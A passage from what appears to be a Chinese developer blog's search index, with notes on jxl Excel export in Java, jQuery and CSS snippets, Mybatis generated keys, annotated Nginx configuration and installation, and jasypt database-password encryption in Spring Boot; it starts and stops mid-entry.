javax.servlet.http.HttpServletResponse;import org.springframework.beans.factory.annotation.Autowired;import jxl.Sheet;import jxl.Workbook;import jxl.read.biff.BiffException;import jxl.write.Label;import jxl.write.WritableImage;import jxl.write.WritableSheet;import jxl.write.WritableWorkbook;/** * @since 2017-11-24 * @author rstyro * */public class ExcelUtils &#123; /** * list 导出到本地excel * @param arrayList 数据,key-value 形式 * @param filePath 生成excel的路径 */ public static void excelOut(ArrayList&lt;Map&lt;String,String&gt;&gt; arrayList,String filePath)&#123; WritableWorkbook bWorkbook = null; try &#123; bWorkbook = Workbook.createWorkbook(new File(filePath)); // 通过Excel对象创建一个选项卡对象 WritableSheet sheet = bWorkbook.createSheet(&quot;sheet1&quot;, 0); //使用循环将数据读出 for (int i = 0; i &lt; arrayList.size(); i++) &#123; Map&lt;String, String&gt; data = arrayList.get(i); int index = 0; for (Map.Entry&lt;String, String&gt; entry : data.entrySet()) &#123; Label label=new Label(index,i,String.valueOf(entry.getValue())); sheet.addCell(label); ++index; &#125; &#125; bWorkbook.write(); System.out.println(&quot;导出成功：路径&gt;&quot;+filePath); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; bWorkbook.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; /** * list 导出到 浏览器 excel * @param arrayList 数据,key-value 形式 * @param filePath 生成excel的路径 */ public static void excelOut(ArrayList&lt;Map&lt;String,String&gt;&gt; arrayList,HttpServletResponse response)&#123; WritableWorkbook bWorkbook = null; try &#123; bWorkbook = Workbook.createWorkbook(response.getOutputStream()); // 通过Excel对象创建一个选项卡对象 WritableSheet sheet = bWorkbook.createSheet(&quot;sheet1&quot;, 0); //使用循环将数据读出 for (int i = 0; i &lt; arrayList.size(); i++) &#123; Map&lt;String, String&gt; data = arrayList.get(i); int index = 0; for (Map.Entry&lt;String, String&gt; entry : data.entrySet()) &#123; Label label=new Label(index,i,String.valueOf(entry.getValue())); sheet.addCell(label); ++index; &#125; &#125; bWorkbook.write(); String fileName=&quot;下载的文件名&quot;; response.setCharacterEncoding(&quot;utf-8&quot;); response.reset(); response.setContentType(&quot;application/OCTET-STREAM;charset=utf-8&quot;); response.setHeader(&quot;pragma&quot;, &quot;no-cache&quot;); response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot;+ fileName + &quot;.xls\&quot;&quot;);// 点击导出excle按钮时候页面显示的默认名称 &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; bWorkbook.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; /** * 图片 导出到本地excel * @param filePath 生成excel的路径 * @param imgPath 图片路径 */ public static void excelOut(String filePath,String imgPath)&#123; WritableWorkbook bWorkbook = null; try &#123; bWorkbook = Workbook.createWorkbook(new File(filePath)); // 通过Excel对象创建一个选项卡对象 WritableSheet sheet = bWorkbook.createSheet(&quot;sheet1&quot;, 0); File imgFile = new File(imgPath); WritableImage image = new WritableImage(0,0,5,5,imgFile); //前两位是起始格，后两位是图片占多少个格，并非是位置。 sheet.addImage(image); bWorkbook.write(); System.out.println(&quot;导出成功：路径&gt;&quot;+filePath); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; bWorkbook.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; /** * 导出到 浏览器 excel * @param filePath 生成excel的路径 * @param imgPath 图片路径 */ public static void excelOut(HttpServletResponse response,String imgPath)&#123; WritableWorkbook bWorkbook = null; try &#123; bWorkbook = Workbook.createWorkbook(response.getOutputStream()); // 通过Excel对象创建一个选项卡对象 WritableSheet sheet = bWorkbook.createSheet(&quot;sheet1&quot;, 0); File imgFile = new File(imgPath); WritableImage image = new WritableImage(0,0,5,5,imgFile); //前两位是起始格，后两位是图片占多少个格，并非是位置。 sheet.addImage(image); bWorkbook.write(); String fileName=&quot;下载的文件名&quot;; response.setCharacterEncoding(&quot;utf-8&quot;); response.reset(); response.setContentType(&quot;application/OCTET-STREAM;charset=utf-8&quot;); response.setHeader(&quot;pragma&quot;, &quot;no-cache&quot;); response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot;+ fileName + &quot;.xls\&quot;&quot;);// 点击导出excle按钮时候页面显示的默认名称 &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; bWorkbook.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; /** * 将Excel中的数据导入 * @param filePath 文件路径 * @return */ public static ArrayList&lt;Map&lt;String,String&gt;&gt; ExcelIn(String filePath)&#123; ArrayList&lt;Map&lt;String,String&gt;&gt;arrayList=new ArrayList&lt;Map&lt;String,String&gt;&gt;(); Workbook bWorkbook=null; try &#123; bWorkbook=Workbook.getWorkbook(new File(filePath)); Sheet sheet=bWorkbook.getSheet(0); for (int i = 0; i &lt; sheet.getRows(); i++) &#123; Map&lt;String,String&gt; map = new HashMap&lt;String, String&gt;(); //获取单元格的值 map.put(&quot;name&quot;, sheet.getCell(0,i).getContents()); map.put(&quot;age&quot;, sheet.getCell(1,i).getContents()); map.put(&quot;sex&quot;, sheet.getCell(2,i).getContents()); arrayList.add(map); &#125; //查询图片个数 for(int i=0;i&lt;sheet.getNumberOfImages();i++) &#123; //获取图片流 InputStream input = new ByteArrayInputStream(sheet.getDrawing(i).getImageData()); //....之后保存省略 &#125; &#125; catch (BiffException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; bWorkbook.close(); &#125; return arrayList; &#125; @Autowired public static void main(String[] args) &#123; Map&lt;String, String&gt; map1 = new HashMap&lt;String, String&gt;(); map1.put(&quot;name&quot;, &quot;名称&quot;); map1.put(&quot;age&quot;, &quot;年龄&quot;); map1.put(&quot;sex&quot;, &quot;性别&quot;); Map&lt;String, String&gt; map2 = new HashMap&lt;String, String&gt;(); map2.put(&quot;name&quot;, &quot;靓女&quot;); map2.put(&quot;age&quot;, &quot;20&quot;); map2.put(&quot;sex&quot;, &quot;女人&quot;); Map&lt;String, String&gt; map3 = new HashMap&lt;String, String&gt;(); map3.put(&quot;name&quot;, &quot;帅哥&quot;); map3.put(&quot;age&quot;, &quot;30&quot;); map3.put(&quot;sex&quot;, &quot;男人&quot;); ArrayList&lt;Map&lt;String,String&gt;&gt; arrayList = new ArrayList&lt;Map&lt;String,String&gt;&gt;(); arrayList.add(map1); arrayList.add(map2); arrayList.add(map3); ExcelUtils.excelOut(arrayList, &quot;F://map.xls&quot;); // ArrayList&lt;Map&lt;String,String&gt;&gt; array = ExcelUtils.ExcelIn(&quot;F://map.xls&quot;);// for(Map&lt;String, String&gt; obj:array)&#123;// for(Map.Entry&lt;String, String&gt; ent: obj.entrySet())&#123;// System.out.println(ent.getKey()+&quot;:&quot;+ent.getValue());// &#125;// System.out.println(&quot;=============================&quot;);// &#125; &#125;&#125; 二、其他1、设置字体123WritableFont font1= new WritableFont(WritableFont.TIMES, 16, WritableFont.BOLD); //设置字体格式为excel支持的格式 WritableFont font3=new WritableFont(WritableFont.createFont(&quot;楷体 _GB2312&quot;), 12, WritableFont.NO_BOLD);WritableCellFormat format1=new WritableCellFormat(font1);Label label=new Label(0, 0, &quot;data 4 test&quot;, format1); 2、对齐方式123456//把水平对齐方式指定为居中format1.setAlignment(jxl.format.Alignment.CENTRE);//把垂直对齐方式指定为居中format1.setVerticalAlignment(jxl.format.VerticalAlignment.CENTRE);//设置自动换行format1.setWrap(true); 3、合并单元格1234WritableSheet sheet = book.createSheet(&quot;sheet1&quot;, 0); //合并第一列第一行到第六列第一行的所有单元格//合并既可以是横向的，也可以是纵向的。合并后的单元格不能再次进行合并，否则会触发异常。sheet.mergeCells(0, 0, 5, 0); 4、指定单元格 行高与列宽123456789//作用是指定第i+1行的高度WritableSheet.setRowView(int i, int height);//比如：将第一行的高度设为200sheet.setRowView(0, 200);//作用是指定第i+1列的宽度，WritableSheet.setColumnView(int i,int width);//比如：将第一列的宽度设为30sheet.setColumnView(0, 30);]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jquery 相关笔记]]></title>
    <url>%2Fblog%2F2017%2F11%2F21%2FJquery%20%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[笔记一、获取各种宽高12345678910111213141516console.log($(window).height()); //浏览器时下窗口可视区域高度console.log($(document).height()); //浏览器时下窗口文档的高度console.log($(document.body).height());//浏览器时下窗口文档body的高度console.log($(document.body).outerHeight(true));//浏览器时下窗口文档body的总高度 包括border padding marginconsole.log($(window).width()); //浏览器时下窗口可视区域宽度console.log($(document).width());//浏览器时下窗口文档对于象宽度console.log($(document.body).width());//浏览器时下窗口文档body的高度console.log($(document.body).outerWidth(true));//浏览器时下窗口文档body的总宽度 包括border padding marginconsole.log($(document).scrollTop()); //获取滚动条到顶部的垂直高度console.log($(document).scrollLeft()); //获取滚动条到左边的垂直宽度console.log($(document).offset().top); //获取绝对位置坐标console.log($(document).offset().left); //获取绝对位置坐标console.log($(document).position().top); //获取相对父级元素的坐标console.log($(document).position().left); //获取相对父级元素的坐标 二、窗口变化时触发的方法123$(window).resize(function()&#123; console.log(&quot;窗口变化了&quot;);&#125;); 三、获取复选框选中的值1234567891011&lt;p&gt;&lt;input type=&apos;checkbox&apos; name=&apos;ids&apos; value=&apos;value1&apos;&gt; &lt;span&gt;文字提醒1&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&apos;checkbox&apos; name=&apos;ids&apos; value=&apos;value2&apos;&gt; &lt;span&gt;文字提醒2&lt;/span&gt;&lt;/p&gt;&lt;script&gt;$(function()&#123; $(&apos;input[name=&quot;ids&quot;]:checked&apos;).each(function()&#123; console.log(&quot;选中的值之一：&quot;,$(this).val()); &#125;);&#125;)&lt;/script&gt;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Css 相关笔记]]></title>
    <url>%2Fblog%2F2017%2F11%2F21%2FCss%20%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[笔记一、滚动条样式123456789101112131415161718192021222324252627282930313233/* 滚动条样式 */ ::-webkit-scrollbar &#123; width: 5px; height: 5px; background-color: #111;&#125; /*定义滚动条轨道 内阴影+圆角*/ ::-webkit-scrollbar-track &#123; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); background-color: rgba(255,255,255,0.5); &#125; /*定义滑块 内阴影+圆角*/ ::-webkit-scrollbar-thumb &#123; border-radius: 10px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: rgba(20,200,230,0.5); &#125; /*滑块效果*/::-webkit-scrollbar-thumb:hover&#123; border-radius: 5px; -webkit-box-shadow: inset 0 0 5px rgba(0,0,0,0.2); background: rgba(0,0,0,0.4);&#125;/*IE滚动条颜色*/html &#123; scrollbar-face-color:#bfbfbf;/*滚动条颜色*/ scrollbar-highlight-color:#000; scrollbar-3dlight-color:#000; scrollbar-darkshadow-color:#000; scrollbar-Shadow-color:#adadad;/*滑块边色*/ scrollbar-arrow-color:rgba(0,0,0,0.4);/*箭头颜色*/ scrollbar-track-color:#eeeeee;/*背景颜色*/&#125; 二、绘制三角形12345678910111213/* 主要样式 border-width 是改变三角形的大小 border-color 4个值是表示 上右下左 四个方向的颜色，transparent 是透明。只要指定3个透明即可实现三角形的效果*/.main em.left&#123; width:0px; height:0px; border-width:10px; border-style:solid; border-color:transparent #111 transparent transparent ; position: absolute; &#125; 三、css 样式优先级，强制覆盖，！important1234.menu-active&#123; border-color: #EE4977 !important; background : #5b5b5b !important;&#125; 四、input 与按钮之类的对齐1vertical-align:top;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis insert 返回主键]]></title>
    <url>%2Fblog%2F2017%2F11%2F20%2FMybatis%20insert%20%E8%BF%94%E5%9B%9E%E4%B8%BB%E9%94%AE%2F</url>
    <content type="text"><![CDATA[Mybatis 主键自增的时候，保存时返回主键。如下demo,在mapper.xml 中定义123456789101112131415161718192021222324&lt;!-- 保存文章 --&gt; &lt;insert id=&quot;saveArticle&quot; parameterType=&quot;pm&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;article_id&quot;&gt; insert into blog_article( &lt;if test=&quot;user_id != null and user_id != &apos;&apos;&quot;&gt; user_id, &lt;/if&gt; title, content, &lt;if test=&quot;text != null and text != &apos;&apos;&quot;&gt; text, &lt;/if&gt; create_time )values( &lt;if test=&quot;user_id != null and user_id != &apos;&apos;&quot;&gt; #&#123;user_id&#125;, &lt;/if&gt; #&#123;title&#125;, #&#123;content&#125;, &lt;if test=&quot;text != null and text != &apos;&apos;&quot;&gt; #&#123;text&#125;, &lt;/if&gt; #&#123;create_time&#125; ) &lt;/insert&gt; useGeneratedKeys 表示给主键设置自增长keyProperty 表示将自增长后的Id赋值给 你的实体类pm添加 article_id 这个字段。pm 是我封装的一个实体类还有其他的方法，但这个是我经常用的，其他不经常用就不粘了。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 配置详解]]></title>
    <url>%2Fblog%2F2017%2F11%2F03%2FNginx%20%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Nginx 配置参数详解默认配置文件在 nginx 目录下的 conf/nginx.conf 内容大概如下： 所有我就把它分为 全局配置、events 、http 吧一、全局区配置1234567891011121314151617181920# 运行用户与用户组，用户组可忽略user nobody;# worker进程的个数，通常应该略少于或等于CPU物理核心数，也可以使用auto自动获取worker_processes 1# 指定所有worker进程所能打开的最大文件句柄数，系统的默认值可通过 ` ulimit -n` 查看，一般都是1024worker_rlimit_nofile 100000;# 生成错误日志的地址，默认是nginx 目录下的logs/error.logerror_log logs/error.log# 指定nginx守护进程的pid文件,默认默认是nginx 目录下的logs/nginx.pidpid logs/nginx.pid# 是否以守护进程方式运行nginx；调试时应该设置为offdaemon &#123;on|off&#125;# 是否以master/worker模型来运行；调试时可以设置为offmaster_process &#123;on|off&#125; 二、events 事件相关的配置12345678910111213141516171819events &#123; # 单个worker进程打开的最大并发连接数，worker_processes*worker_connections worker_connections 1024; # 指明使用的事件模型：建议让Nginx自行选择,linux建议epoll，FreeBSD建议采用kqueue，window下不指定。 use [epoll|rtsig|select|poll]; # keepalive超时时间。 keepalive_timeout 60; # 这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。 open_file_cache max=65535 inactive=60s; # 这个是指多长时间检查一次缓存的有效信息。 open_file_cache_valid 80s;&#125; 三、http 服务器配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186http &#123; # include指在当前文件中包含另一个文件内容 # 设定mime类型,类型由mime.type文件定义 include conf/mime.types; # 这里是代理的配置文件，建议另建立一个proxy.conf 然后在这里include 进行引用。 include /etc/nginx/proxy.conf; #添加fastcgi 的配置，具体可看官网栗子:https://www.nginx.com/resources/wiki/start/topics/examples/fastcgiexample/ include /etc/nginx/fastcgi.conf; # 首页索引 index index.html index.htm index.php; #设置文件使用默认的mine-type default_type application/octet-stream; # 日志格式设置。 # $remote_addr与$http_x_forwarded_for用以记录客户端的ip地址； # $remote_user：用来记录客户端用户名称； # $time_local： 用来记录访问时间与时区； # $status： 用来记录请求状态；成功是200， # $request： 用来记录请求的url与http协议； # $body_bytes_sent ：记录发送给客户端文件主体内容大小； # $http_referer：用来记录从那个页面链接访问过来的； # $http_user_agent：记录客户浏览器的相关信息； log_format main &apos;$remote_addr - $remote_user [$time_local] $status &apos; &apos;&quot;$request&quot; $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; log_format mylog &apos;$remote_addr - &quot;$http_x_forwarded_for&quot; - $remote_user [$time_local] $status &apos; &apos;&quot;$request&quot; $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &apos;; # 声明log log位置 log格式; access_log logs/access_8080.log mylog; # sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，应设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime sendfile on; # 打开linux下TCP_CORK，sendfile打开时才有效，作减少报文段的数量之用 tcp_nopush on; # 保存服务器名字的hash表 大小，如果server很多，就调大一点 server_names_hash_bucket_size 128; # this seems to be required for some vhosts #在一个长连接所能够允许请求的最大资源数 keepalive_requests 20; #为制定类型的User Agent禁用长连接 keepalive_disable [msie6|safari|none]; #是否对长连接使用TCP_NODELAY选项,不将多个小文件合并传输 tcp_nodelay on; #设置nginx采用gzip压缩的形式发送数据，减少发送数据量，但会增加请求处理时间及CPU处理时间，需要权衡 gzip on; #加vary给代理服务器使用，针对有的浏览器支持压缩，有个不支持，根据客户端的HTTP头来判断是否需要压缩 gzip_vary on; #nginx在压缩资源之前，先查找是否有预先gzip处理过的资源 #!gzip_static on; #为指定的客户端禁用gzip功能 gzip_disable &quot;MSIE[1-6]\.&quot;; #允许或禁止压缩基于请求和相应的响应流，any代表压缩所有请求 gzip_proxied any; #设置对数据启用压缩的最少字节数，如果请求小于1024字节则不压缩，会影响请求速度 gzip_min_length 1024; #设置数据压缩等级，1-9之间，9最慢压缩比最大 gzip_comp_level 6; #设置需要压缩的数据格式 gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss; #定义错误提示页面 error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # PHP server &#123; # php/fastcgi listen 80; server_name domain1.com www.domain1.com; access_log logs/domain1.access.log main; root html; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:1025; &#125; &#125; # JSP server &#123; listen 80; server_name jspServer; access_log logs/tomcat.access.log main; root /usr/local/tomcat/webapps/ROOT; location ~ \.jsp$&#123; proxy_pass http://127.0.0.1:8080; index index.jsp; &#125; &#125; # 这里可以弄一个静态资源访问服务器 server &#123; # simple reverse-proxy #监听80端口 listen 80; #定义主机名，主机名可以有多个，名称还可以使用正则表达式(~)或通配符 #(1)先做精确匹配检查 #(2)左侧通配符匹配检查：*.lrshuai.top #(3)右侧通配符匹配检查：mail.* #(4)正则表达式匹配检查：如~^.*\.lrshuai\.top$ #(5)detault_server server_name lrshuai.top www.lrshuai.top; #设定主机的访问日志 access_log logs/blog.access.log main; # serve static files - 静态文件过滤 location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; # 定义服务器的默认网站根目录位置 root /var/www/virtual/big.server.com/htdocs; # expires 30s 缓存30秒; # expires 30m 缓存30分钟; # expires 2h 缓存2小时; # expires 30d 缓存30天; expires 30d; &#125; # pass requests for dynamic content to rails/turbogears/zope, et al # 负载，请求转发到8080端口的服务器 location / &#123; proxy_pass http://127.0.0.1:8080; &#125; &#125; # 定义负载均衡服务器列表，名字为：big_server_com # weight参数表示权重值，权值越高被分配到的几率越大 upstream big_server_com &#123; # 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 ip_hash; server 127.0.0.3:8000 weight=5; server 127.0.0.3:8001 weight=5; server 192.168.0.1:8000; server 192.168.0.1:8001; &#125; # 负载均衡配置 server &#123; # simple load balancing listen 80; server_name big.server.com; access_log logs/big.server.access.log main; # location [=|~|~*|^~] uri &#123;...&#125; # 功能：允许根据用户请求的URI来匹配定义的个location，匹配到时，此请求将被相应的location配置块中的配置所处理 # =：表示精确匹配检查 # ~：正则表达式模式匹配检查，区分字符大小写 # ~*：正则表达式模式匹配检查，不区分字符大小写 # ^~：URI的前半部分匹配，不支持正则表达式 # !~：开头表示区分大小写的不匹配的正则 # !~*：开头表示不区分大小写的不匹配的正则 # /：通用匹配，任何请求都会被匹配到 location / &#123; #引用反向代理的配置，配置文件目录根据编译参数而定 #如果编译时加入了--conf-path=/etc/nginx/nginx.conf指定了配置文件的路径那么就把proxy.conf放在/etc/nginx/目录下 #如果没有制定配置文件路径那么就把proxy.conf配置放到nginx的conf目录下,要么写绝对路径 include proxy.conf; # 定义后端负载服务器组 proxy_pass http://big_server_com; &#125; &#125;&#125; proxy.conf123456789101112131415161718192021# 后端的服务器可以通过X-Forwarded-For获取用户真实IPproxy_redirect off;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;# 允许客户端请求的最大单文件字节数client_max_body_size 10m;client_body_buffer_size 512k;# nginx跟后端服务器连接超时时间(代理连接超时)proxy_connect_timeout 90;# 后端服务器数据回传时间(代理发送超时)proxy_send_timeout 90;# 连接成功后，后端服务器响应时间(代理接收超时)proxy_read_timeout 90;#proxy_buffers缓冲区，网页平均在32k以下的设置proxy_buffers 32 4k; fastcgi.conf123456789101112131415161718192021fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;fastcgi_param QUERY_STRING $query_string;fastcgi_param REQUEST_METHOD $request_method;fastcgi_param CONTENT_TYPE $content_type;fastcgi_param CONTENT_LENGTH $content_length;fastcgi_param SCRIPT_NAME $fastcgi_script_name;fastcgi_param REQUEST_URI $request_uri;fastcgi_param DOCUMENT_URI $document_uri;fastcgi_param DOCUMENT_ROOT $document_root;fastcgi_param SERVER_PROTOCOL $server_protocol;fastcgi_param GATEWAY_INTERFACE CGI/1.1;fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;fastcgi_param REMOTE_ADDR $remote_addr;fastcgi_param REMOTE_PORT $remote_port;fastcgi_param SERVER_ADDR $server_addr;fastcgi_param SERVER_PORT $server_port;fastcgi_param SERVER_NAME $server_name;fastcgi_index index.php;fastcgi_param REDIRECT_STATUS 200; 四、其他补充1、查看Nginx状态123456789101112131415161718192021# 设定查看Nginx状态的地址# 只能定义在location中location /Status &#123; stub_status on; # 允许所有ip allow all; #access_log off; #allow 192.168.1.0/24; #deny all; #auth_basic &quot;Status&quot;; #auth_basic_user_file /etc/nginx/.htpasswd;&#125; # status结果实例说明：# Active connections: 1 (当前所有处于打开状态的连接数)# server accepts handled requests# 174(已经接受进来的连接) 174(已经处理过的连接) 492(处理的请求，在保持连接模式下，请求数可能会多于连接数量)# Reading: 0 Writing: 1 Waiting: 0 # Reading:正处于接受请求状态的连接数# Writing:请求接受完成，正处于处理请求或发送相应的过程中的连接数# Waiting:保持连接模式，且处于活动状态的连接数 2、防盗链123456789location ~* \.(jpg|gif|jpeg|png)$ &#123; # 当一个请求头的Referer字段中包含一些非正确的字段，这个模块可以禁止这个请求访问站点,这个指令在referer头的基础上为 $invalid_referer 变量赋值，其值为0或1 # 如果valid_referers列表中没有Referer头的值， $invalid_referer将被设置为1 # 下面的意思是如果来路不是来自 lrshuai.top 域 将跳转403页面 valid_referer none blocked www.lrshuai.top *.lrshuai.top; if ($invalid_referer) &#123; rewrite ^/ http://www.lrshuai.top/403.html; &#125;&#125; 3、rewrite 重定向，限制IE访问12345# 若是ie 浏览器，将重定向到ie.htmlif ($http_user_agent ~ MSIE) &#123;rewrite ^.*$ /ie.htm;break; #(不break会循环重定向)&#125; 4、限制ip访问12345678location /&#123; # 网段192.168.1.0 这个网段全部不给访问 deny 192.168.1.0/24; allow 192.168.12.0/24; # 可以重定向 # rewrite ...&#125; 参考自：https://www.nginx.com/resources/wiki/start/topics/examples/full/]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Nginx]]></title>
    <url>%2Fblog%2F2017%2F11%2F02%2F%E5%AE%89%E8%A3%85Nginx%20%2F</url>
    <content type="text"><![CDATA[安装Nginx一、下载源码包下载地址：http://nginx.org/en/download.htmlNginx官网提供了三个类型的版本Mainline version：Mainline 是 Nginx 目前主力在做的版本，可以说是开发版Stable version：最新稳定版，生产环境上建议使用的版本Legacy versions：遗留的老版本的稳定版1wget http://nginx.org/download/nginx-1.12.2.tar.gz 二、安装编译环境1yum install -y gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel 三、编译与安装1、下载之后解压1tar -zxvf nginx-1.12.2.tar.gz 2、进入解压后的目录1cd nginx-1.12.2 3、配置安装选项123456# 可通过`./configure --help | more ` 查看配置参数列表# --prefix=/usr/local/nginx 指定安装目录，# --with-http_stub_status_module 监控页面# --with-http_ssl_module ssl ,搭建https 时需要此模块# ./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module./configure --help --prefix=/usr/local/nginx 4、编译并安装1make &amp;&amp; make install 四、启动Nginx进入nginx 目录，下面有4个目录conf – 配置文件html – 网页文件logs – 日志文件sbin – 主要二进制程序12345# 进入目录cd /usr/local/nginx/# 启动nginx sbin/nginx 浏览器访问，直接在地址栏写上服务器ip 即可，nginx 默认启动端口是80端口。五、Nginx 命令1、信号控制语法：有如下两个 Kill -信号选项 nginx的主进程号 Kill -信号选项 cat /usr/local/nginx/logs/nginx.pid 信号选项如下： 信号选项 选项说明 TERM, INT Quick shutdown QUIT Graceful shutdown 优雅的关闭进程,即等请求结束后再关闭 HUP Configuration reload ,Start the new worker processes with a new configuration Gracefully shutdown the old worker processes 改变配置文件,平滑的重读配置文件 USR1 Reopen the log files 重读日志,在日志按月/日分割时有用 USR2 Upgrade Executable on the fly 平滑的升级 WINCH Gracefully shutdown the worker processes 优雅关闭旧的进程(配合USR2来进行升级) 栗子：kill -QUIT $( cat /usr/local/nginx/logs/nginx.pid ) 停止nginx2、二进制文件加参数 参数 参数说明 -?, -h Print help. -v Print version. -V Print NGINX version, compiler version and configure parameters. -t Don’t run, just test the configuration file. NGINX checks configuration for correct syntax and then try to open files referred in configuration. -q Suppress non-error messages during configuration testing. -s signal signal Send signal to a master process: stop – 停止, quit – 也是停止比较优雅, reopen – 重新生成日志, reload – 重新加载日志. (version &gt;= 0.7.53) -p prefix prefix Set prefix path (default: /usr/local/nginx/). (version &gt;= 0.7.53) -c filename filename Specify which configuration file NGINX should use instead of the default. -g directives Set global directives. (version &gt;= 0.7.4) 栗子：/usr/bin/nginx -s stop 停止nginx不明白可参考：https://www.nginx.com/resources/wiki/start/topics/tutorials/commandline/ 六、可能出现的错误1、缺少C语言环境 1、checking for C compiler cc … not found 12# 解决方法yum install -y gcc gcc-c++ 2、需要安装pcre pcre-devel,为了让nginx 支持 rewrite 这个模块 2、./configure: error: the HTTP rewrite module requires the PCRE library.You can either disable the module by using –without-http_rewrite_moduleoption, or install the PCRE library into the system, or build the PCRE librarystatically from the source with nginx by using –with-pcre= option。 12# 解决方法yum install -y pcre pcre-devel 3、安装 zlib zlib-devel ,为了让nginx 支持 gzip 模块 3、./configure: error: the HTTP gzip module requires the zlib library.You can either disable the module by using –without-http_gzip_moduleoption, or install the zlib library into the system, or build the zlib librarystatically from the source with nginx by using –with-zlib= option 12# 解决方法yum install -y zlib zlib-devel 4、端口没开放 4、都没报错，但浏览器访问ip，访问不到。请检查80端口是否开放。可以用windows 的telnet 命令 telnet 你的服务器ip 80 ,如果提示 telent 未找到，请百度搜 ：开启telnet服务，这里就不多说了。 # 参考自：https://www.nginx.com/resources/wiki/start/topics/tutorials/commandline/]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>开发工具</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot druid连接池数据库密码加密]]></title>
    <url>%2Fblog%2F2017%2F11%2F01%2FSpringboot%20druid%E8%BF%9E%E6%8E%A5%E6%B1%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[Springboot druid连接池数据库密码加密突然发现，好久好久没有更新文章了，哎，最近好多事情要做。不说了，都是泪 一、导入依赖12345&lt;dependency&gt; &lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt; &lt;artifactId&gt;jasypt-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt; 二、加解密工具类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.jasypt.encryption.pbe.StandardPBEStringEncryptor;import org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig;public class DBEncryptUtil &#123; public static void main(String[] args) &#123; String plaintext=&quot;lrshuai.top&quot;; String ciphertext=&quot;&quot;; ciphertext = encrypt(plaintext); System.out.println(&quot;ciphertext=&quot;+ciphertext); plaintext = decrypt(ciphertext); System.out.println(&quot;plaintext=&quot;+plaintext); &#125; /** * 加密，每次生成的密码都是不一样的，但是解密后的字符串是一样的 * @param plaintext 明文字符串 * @return */ public static String encrypt(String plaintext) &#123; // 创建加密器 StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor(); // 配置 EnvironmentStringPBEConfig config = new EnvironmentStringPBEConfig(); config.setAlgorithm(&quot;PBEWithMD5AndDES&quot;);// 加密算法 config.setPassword(&quot;rstyro&quot;);// 系统属性值 encryptor.setConfig(config); String ciphertext = encryptor.encrypt(plaintext); // 加密 return ciphertext; 